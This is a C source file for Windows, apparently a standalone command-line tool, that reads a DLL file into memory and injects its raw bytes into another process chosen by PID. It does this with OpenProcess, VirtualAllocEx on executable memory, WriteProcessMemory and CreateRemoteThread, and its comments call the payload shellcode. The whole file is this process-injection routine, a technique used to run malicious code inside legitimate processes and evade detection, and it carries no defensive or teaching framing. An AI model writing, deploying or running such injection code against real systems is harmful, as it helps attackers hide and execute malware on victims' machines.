#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma warning(disable:4996)

int main(int argc, char* argv[]) {

    // Check parameters
    if (argc != 3)
    {
        printf("Usage: %s <PID> <dllName>\n", argv[0]);
        return 0;
    }

    // Specify the path to the DLL file

    const char* dllFilePath = argv[2];

    // *******************************
    // Extract raw bytes from DLL file
    // *******************************


    // Open the DLL file in binary mode
    FILE* file = fopen(dllFilePath, "rb");

    if (file == NULL) {
        perror("Error opening file");
        return 1;
    }

    // Seek to the end of the file to get its size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Initialize variables for reading
    size_t bufferSize = 1024;  // Adjust this based on your needs
    char* dllBytes = (char*)malloc(bufferSize);
    size_t bytesRead = 0;
    int byte;

    if (dllBytes == NULL) {
        perror("Error allocating memory");
        fclose(file);
        return 1;
    }

    // Read the content of the DLL file byte by byte
    while ((byte = fgetc(file)) != EOF) {
        dllBytes[bytesRead++] = (char)byte;

        // Check if the buffer needs to be resized
        if (bytesRead == bufferSize) {
            bufferSize *= 2;  // Double the buffer size (you can adjust this as needed)
            dllBytes = (char*)realloc(dllBytes, bufferSize);

            if (dllBytes == NULL) {
                perror("Error reallocating memory");
                fclose(file);
                return 1;
            }
        }
    }

    // Close the file
    fclose(file);

    printf("Dll Size: %d\t", bytesRead);

    /*
    // Print the byte array to the console
    printf("const unsigned char dllBytes[] = {");
    for (size_t i = 0; i < bytesRead; i++) {
        printf("0x%02X", (unsigned char)dllBytes[i]);

        if (i < bytesRead - 1) {
            printf(", ");
        }
    }
    printf("};\n");
   */

    // Now you have the DLL content in the dllBytes array
   
    // **************************************************************
    // Inject the raw DLL as shellcode into the remote process
    // **************************************************************

    HANDLE ph; // process handle
    HANDLE rt; // remote thread
    LPVOID rb; // remote buffer

    // parse process ID
    if (atoi(argv[1]) == 0) {
        printf("PID not found :( exiting...\n");
        return 1;
    }
    printf("\tPID: %i", atoi(argv[1]));
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    if (ph == INVALID_HANDLE_VALUE)
    {
        printf("\nOpenProcess() Failed."); 
        return 1;
    }

    rb = VirtualAllocEx(ph, 0, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (rb == NULL)
    {
        printf("\nVirtualAllocEx() Failed");  
        CloseHandle(ph);
        return 1;
    }

    printf("\t[*]Remote Address: %p\n", rb);

    WriteProcessMemory(ph, rb, dllBytes, bytesRead, 0);
    printf("\nInjection successfull\n");
    printf("Running Shellcode......\n");

    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, 0);
    if (rt == NULL)
    {
        printf("Failed to Run Shellcode\n"); 
        return 1;
    }


    // Remember to free the allocated memory when done
    free(dllBytes);

    return 0;
}
